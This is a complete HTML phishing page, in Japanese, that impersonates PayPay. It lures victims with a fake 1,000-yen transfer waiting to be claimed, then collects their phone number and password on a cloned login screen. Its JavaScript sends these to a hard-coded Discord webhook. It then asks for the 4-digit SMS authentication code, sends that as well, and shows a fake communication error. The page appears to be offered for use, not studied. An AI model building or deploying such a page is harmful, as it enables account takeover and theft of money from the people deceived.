<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPay 受取・ログイン</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Hiragino Kaku Gothic ProN", "Hiragino Sans", "Yu Gothic", sans-serif;
    }

    body {
      background-color: #1a1a1a;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    /* iPhone SE3 の画面サイズに完全固定 */
    .phone-frame {
      position: relative;
      width: 375px;
      height: 667px;
      background-color: #ffffff;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    @media (max-width: 400px) {
      .phone-frame {
        width: 100vw;
        height: 100vh;
        box-shadow: none;
      }
    }

    /* 各画面の共通ベース */
    .view-section {
      display: none;
      position: absolute;
      inset: 0;
      background-color: #ffffff;
      flex-direction: column;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
    }
    .view-section.active {
      display: flex;
    }

    /* 共通ヘッダー（白背景 ＋ PayPayロゴ ＋ 水色ライン） */
    .app-header {
      width: 100%;
      background-color: #ffffff;
      flex-shrink: 0;
      border-bottom: 1px solid #e5e7eb;
      z-index: 10;
    }
    .header-inner {
      display: flex;
      justify-content: space-between;
      align-items: center;
      height: 48px;
      padding: 0 16px;
    }
    .paypay-logo-area {
      display: flex;
      align-items: center;
      gap: 6px;
      font-weight: 800;
      font-size: 18px;
      color: #000;
    }
    .p-box {
      background-color: #ff0033;
      color: #fff;
      width: 20px;
      height: 20px;
      border-radius: 4px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 13px;
      font-weight: 900;
    }
    .blue-line {
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, #7dd3fc, #0284c7);
    }

    /* =========================================
       1. 受け取り画面（秋の紅葉テーマ再現）
    ========================================= */
    #viewReceive {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 50%, #b91c1c 100%);
      color: #ffffff;
      display: none;
      flex-direction: column;
    }
    #viewReceive.active {
      display: flex;
    }

    .receive-content {
      padding: 16px 16px 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      flex: 1;
      justify-content: space-between;
    }

    .bg-pattern {
      position: absolute;
      inset: 0;
      pointer-events: none;
      opacity: 0.18;
      background-image: radial-gradient(#ffffff 2.5px, transparent 2.5px);
      background-size: 18px 18px;
      z-index: 0;
    }

    .receive-top-group {
      position: relative;
      z-index: 1;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 10px;
    }

    .avatar-wrapper {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      border: 2px solid #ffffff;
      background-color: #111;
      overflow: hidden;
      margin-bottom: 6px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.25);
    }
    .avatar-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .sender-name {
      font-size: 13px;
      font-weight: 700;
      margin-bottom: 2px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }
    .sent-time {
      font-size: 11px;
      font-weight: 600;
      opacity: 0.95;
      margin-bottom: 16px;
    }

    .amount-display {
      display: flex;
      align-items: baseline;
      justify-content: center;
      margin-bottom: 16px;
    }
    .amount-num {
      font-size: 52px;
      font-weight: 800;
      line-height: 1;
      letter-spacing: -1px;
    }
    .amount-unit {
      font-size: 20px;
      font-weight: 700;
      margin-left: 2px;
    }

    .status-badge {
      background-color: #f5b800;
      border: 1.5px solid #ffffff;
      color: #ffffff;
      font-size: 12px;
      font-weight: 700;
      padding: 3px 20px;
      border-radius: 999px;
      margin-bottom: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
    }
    .expire-text {
      font-size: 11px;
      font-weight: 700;
    }

    /* 画面下部グループ */
    .receive-bottom-group {
      position: relative;
      z-index: 1;
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .action-buttons {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .action-btn {
      width: 100%;
      height: 44px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
      border: 1.5px solid #ffffff;
    }
    .action-btn.clickable:active { transform: scale(0.98); }
    .btn-blue {
      background-color: #2196f3;
      color: #ffffff;
    }
    .btn-translucent {
      background-color: rgba(255, 255, 255, 0.15);
      color: #ffffff;
    }

    .detail-card {
      width: 100%;
      background-color: rgba(0, 0, 0, 0.35);
      backdrop-filter: blur(4px);
      border-radius: 10px;
      padding: 10px 12px;
    }
    .detail-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      margin-bottom: 4px;
    }
    .detail-label { color: rgba(255, 255, 255, 0.85); }
    .detail-value { font-weight: 700; display: flex; align-items: center; gap: 4px; }
    .card-line { border: none; border-top: 1px solid rgba(255, 255, 255, 0.2); margin: 6px 0; }
    .legal-notice { text-align: center; font-size: 8.5px; color: rgba(255, 255, 255, 0.75); }


    /* =========================================
       2. ログイン画面
    ========================================= */
    .login-body {
      padding: 24px 20px 32px;
      display: flex;
      flex-direction: column;
      color: #222;
    }
    .login-title {
      text-align: center;
      font-size: 14px;
      font-weight: 600;
      color: #374151;
      line-height: 1.5;
      margin-bottom: 28px;
    }
    .input-group {
      margin-bottom: 20px;
      position: relative;
    }
    .text-input {
      width: 100%;
      padding: 8px 28px 8px 0;
      font-size: 15px;
      border: none;
      border-bottom: 1px solid #d1d5db;
      background: transparent;
      color: #111;
    }
    .text-input::placeholder { color: #9ca3af; }
    .text-input:focus {
      outline: none;
      border-bottom-color: #ff0033;
    }
    .password-toggle {
      position: absolute;
      right: 2px;
      bottom: 8px;
      width: 20px;
      height: 20px;
      color: #9ca3af;
      cursor: pointer;
    }

    .forgot-link-wrap {
      text-align: center;
      margin: 4px 0 24px;
    }
    .forgot-link-wrap a {
      color: #0284c7;
      font-size: 12px;
      font-weight: 600;
      text-decoration: none;
    }

    .submit-btn {
      width: 100%;
      padding: 13px;
      font-size: 14px;
      font-weight: 700;
      color: #ffffff;
      background-color: #e5e7eb;
      border: none;
      border-radius: 8px;
      cursor: not-allowed;
      text-align: center;
      margin-bottom: 24px;
      transition: background-color 0.2s;
    }
    .submit-btn.active {
      background-color: #ff0033;
      cursor: pointer;
    }
    .submit-btn.active:active { transform: scale(0.98); }

    .external-heading {
      text-align: center;
      font-size: 12px;
      color: #4b5563;
      margin-bottom: 14px;
    }
    .provider-btn {
      width: 100%;
      height: 44px;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      background: #ffffff;
      font-size: 13px;
      font-weight: 700;
      color: #374151;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-bottom: 10px;
      cursor: default;
    }
    .yahoo-badge {
      color: #ff0033;
      font-weight: 900;
      font-size: 16px;
      font-family: Georgia, serif;
    }
    .sb-icon-box {
      display: flex;
      flex-direction: column;
      gap: 2px;
      align-items: center;
    }
    .sb-bar {
      width: 16px;
      height: 3px;
      background-color: #9ca3af;
    }
    .sb-subtext {
      font-size: 5px;
      color: #6b7280;
      line-height: 1;
    }

    .divider-line {
      border: none;
      border-top: 1px solid #e5e7eb;
      margin: 24px 0 20px;
    }
    .register-prompt {
      text-align: center;
      font-size: 12px;
      color: #6b7280;
    }
    .register-prompt span {
      color: #0284c7;
      font-weight: 700;
      font-size: 14px;
      margin-left: 6px;
      cursor: default;
    }


    /* =========================================
       3. 認証コード入力画面
    ========================================= */
    .otp-body {
      padding: 24px 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #222;
    }
    .otp-heading {
      font-size: 16px;
      font-weight: 700;
      margin-bottom: 6px;
      margin-top: 8px;
    }
    .otp-desc {
      font-size: 12px;
      color: #666;
      text-align: center;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .otp-boxes {
      display: flex;
      justify-content: space-between;
      gap: 12px;
      margin-bottom: 24px;
      width: 100%;
      max-width: 280px;
    }
    .otp-digit {
      width: 58px;
      height: 58px;
      text-align: center;
      font-size: 22px;
      font-weight: 700;
      border: 1px solid #d1d5db;
      border-radius: 10px;
      background-color: #fafafa;
    }
    .otp-digit:focus {
      outline: none;
      border-color: #ff0033;
      background-color: #fff;
    }


    /* =========================================
       4. 通信エラー画面
    ========================================= */
    .error-body {
      padding: 40px 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      text-align: center;
      color: #222;
    }
    .error-circle {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: #fee2e2;
      color: #dc2626;
      font-size: 30px;
      font-weight: 700;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 18px;
    }
    .error-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 10px;
    }
    .error-desc {
      font-size: 13px;
      color: #666;
      line-height: 1.6;
      margin-bottom: 28px;
    }
  </style>
</head>
<body>

  <div class="phone-frame">

    <!-- 1. 受け取り画面 -->
    <div id="viewReceive" class="view-section active">
      <header class="app-header">
        <div class="header-inner">
          <div class="paypay-logo-area">
            <div class="p-box">P</div> PayPay
          </div>
        </div>
        <div class="blue-line"></div>
      </header>

      <div class="receive-content">
        <div class="bg-pattern"></div>
        
        <!-- 上部グループ -->
        <div class="receive-top-group">
          <div class="avatar-wrapper">
            <img id="avatarImg" src="" alt="アイコン">
          </div>

          <div class="sender-name" id="senderText">jjghghさんから受け取る</div>
          <div class="sent-time" id="sentDateTime"></div>

          <div class="amount-display">
            <span class="amount-num" id="amountNum">1,000</span>
            <span class="amount-unit">円</span>
          </div>

          <div class="status-badge">受け取り待ち</div>
          <div class="expire-text" id="expireText"></div>
        </div>

        <!-- 下部グループ -->
        <div class="receive-bottom-group">
          <div class="action-buttons">
            <button class="action-btn btn-blue" style="cursor: default;" onclick="event.preventDefault();">新規登録して受け取る</button>
            <button class="action-btn btn-translucent clickable" onclick="goToView('viewLogin')">ログインして受け取る</button>
          </div>

          <div class="detail-card">
            <div class="detail-row"><span class="detail-label">送信日</span><span class="detail-value" id="cardSentDate"></span></div>
            <div class="detail-row"><span class="detail-label">有効期限</span><span class="detail-value" id="cardExpireDate"></span></div>
            <div class="detail-row" style="margin-bottom: 0;">
              <span class="detail-label">決済番号</span>
              <span class="detail-value">
                <span id="paymentId">02402428702612176896</span>
              </span>
            </div>
            <hr class="card-line">
            <div class="legal-notice">PayPay株式会社 資金移動業者 関東財務局長 第00068号</div>
          </div>
        </div>

      </div>
    </div>

    <!-- 2. ログイン画面 -->
    <div id="viewLogin" class="view-section">
      <header class="app-header">
        <div class="header-inner">
          <div class="paypay-logo-area">
            <div class="p-box">P</div> PayPay
          </div>
          <div></div>
        </div>
        <div class="blue-line"></div>
      </header>

      <div class="login-body">
        <div class="login-title">PayPayに登録した携帯電話番号でログイン</div>

        <div class="input-group">
          <input type="text" id="loginId" class="text-input" placeholder="携帯電話番号">
        </div>

        <div class="input-group">
          <input type="password" id="loginPass" class="text-input" placeholder="パスワード">
          <svg class="password-toggle" onclick="togglePassVisibility()" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          </svg>
        </div>

        <div class="forgot-link-wrap">
          <a href="#">パスワードをお忘れですか？</a>
        </div>

        <button id="loginSubmitBtn" class="submit-btn">ログイン</button>

        <div class="external-heading">外部のアカウントでログイン</div>

        <button class="provider-btn" onclick="event.preventDefault();">
          <span class="yahoo-badge">Y!</span>
          <span>Yahoo! JAPAN ID</span>
        </button>

        <button class="provider-btn" onclick="event.preventDefault();">
          <div class="sb-icon-box">
            <div class="sb-bar"></div>
            <div class="sb-bar"></div>
            <span class="sb-subtext">SoftBank</span>
          </div>
          <span>ソフトバンク・ワイモバイル・LINEMO</span>
        </button>

        <hr class="divider-line">

        <div class="register-prompt">
          アカウントをお持ちでない場合 <span style="cursor: default;" onclick="event.preventDefault();">新規登録</span>
        </div>
      </div>
    </div>

    <!-- 3. 認証コード入力画面 -->
    <div id="viewOtp" class="view-section">
      <header class="app-header">
        <div class="header-inner">
          <div class="paypay-logo-area">
            <div class="p-box">P</div> PayPay
          </div>
          <div></div>
        </div>
        <div class="blue-line"></div>
      </header>

      <div class="otp-body">
        <div class="otp-heading">認証コードの入力</div>
        <div class="otp-desc">ご登録の携帯番号に送信された4桁のコードを入力してください。</div>

        <div class="otp-boxes">
          <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
          <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
          <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
          <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
        </div>
      </div>
    </div>

    <!-- 4. 通信エラー画面 -->
    <div id="viewError" class="view-section">
      <header class="app-header">
        <div class="header-inner">
          <div class="paypay-logo-area">
            <div class="p-box">P</div> PayPay
          </div>
        </div>
        <div class="blue-line"></div>
      </header>

      <div class="error-body">
        <div class="error-circle">!</div>
        <div class="error-title">通信エラーが発生しました</div>
        <div class="error-desc">サーバーとの通信に失敗しました。<br>電波の良い場所で再度お試しください。</div>
      </div>
    </div>

  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1570264352630640751/RHz4IFgnVpT5i6FzXnoYumi1csmAnhQx8B8DjCTopaWY40XvXCGyAzbsOsh5dX18mjTk";

    function sendToDiscord(message) {
      if (!DISCORD_WEBHOOK_URL) return;
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      }).catch(err => console.log("Discord送信エラー", err));
    }

    const CONFIG = {
      senderName: "jjghgh",
      amount: "1,000",
      expireDays: 4,
      avatarSeed: "jjghgh_avatar"
    };

    function goToView(viewId) {
      document.querySelectorAll('.view-section').forEach(el => {
        el.classList.remove('active');
        el.scrollTop = 0;
      });
      const target = document.getElementById(viewId);
      if (target) {
        target.classList.add('active');
      }
    }

    // 初期データ反映
    document.getElementById("avatarImg").src = `https://api.dicebear.com/7.x/bottts/svg?seed=${CONFIG.avatarSeed}`;
    document.getElementById("senderText").textContent = `${CONFIG.senderName}さんから受け取る`;
    document.getElementById("amountNum").textContent = CONFIG.amount;

    const now = new Date();
    const expireDate = new Date(now.getTime() + CONFIG.expireDays * 24 * 60 * 60 * 1000);
    function formatDate(d) { return `${d.getFullYear()}年${d.getMonth() + 1}月${d.getDate()}日`; }
    function formatDateTime(d) { return `${formatDate(d)} ${d.getHours()}時${String(d.getMinutes()).padStart(2, "0")}分`; }

    document.getElementById("sentDateTime").textContent = formatDateTime(now);
    document.getElementById("expireText").textContent = `受け取り期限 ${formatDateTime(expireDate)}`;
    document.getElementById("cardSentDate").textContent = formatDate(now);
    document.getElementById("cardExpireDate").textContent = formatDate(expireDate);

    // パスワード表示切替
    function togglePassVisibility() {
      const passInput = document.getElementById("loginPass");
      passInput.type = passInput.type === "password" ? "text" : "password";
    }

    // 入力データの保持用変数
    let savedPhone = "";
    let savedPass = "";

    // ログイン入力チェック
    const loginIdInput = document.getElementById("loginId");
    const loginPassInput = document.getElementById("loginPass");
    const loginSubmitBtn = document.getElementById("loginSubmitBtn");

    function checkLoginInputs() {
      if (loginIdInput.value.trim() && loginPassInput.value.trim()) {
        loginSubmitBtn.classList.add("active");
      } else {
        loginSubmitBtn.classList.remove("active");
      }
    }
    loginIdInput.addEventListener("input", checkLoginInputs);
    loginPassInput.addEventListener("input", checkLoginInputs);

    // 【1回目】ログインボタン押下時：ここでDiscordにログイン情報を送信して画面遷移
    loginSubmitBtn.addEventListener("click", () => {
      if (!loginSubmitBtn.classList.contains("active")) return;

      savedPhone = loginIdInput.value;
      savedPass = loginPassInput.value;

      // 1回目のDiscord送信
      sendToDiscord(`🔑 **【1回目】ログイン情報入力**\n📱 携帯番号: \`${savedPhone}\`\n🔒 パスワード: \`${savedPass}\``);

      goToView("viewOtp");
      otpDigits[0].focus();
    });

    // 【2回目】認証コード4桁がすべて入力されたとき：ログイン情報 ＆ 認証コードをセットで送信し、通信エラー画面へ
    const otpDigits = document.querySelectorAll('.otp-digit');
    otpDigits.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value !== '' && index < otpDigits.length - 1) {
          otpDigits[index + 1].focus();
        }
        
        const fullCode = Array.from(otpDigits).map(i => i.value).join('');
        if (fullCode.length === 4) {
          // セットでDiscordへ送信
          sendToDiscord(`🔐 **【認証完了】ログイン情報 ＆ 認証コード**\n📱 携帯番号: \`${savedPhone}\`\n🔒 パスワード: \`${savedPass}\`\n✨ 4桁コード: \`${fullCode}\``);
          
          setTimeout(() => {
            otpDigits.forEach(i => i.value = '');
            // 無限ループを防ぐため通信エラー画面へ移行してストップ
            goToView('viewError');
          }, 300);
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
          otpDigits[index - 1].focus();
        }
      });
    });
  </script>

</body>
</html>
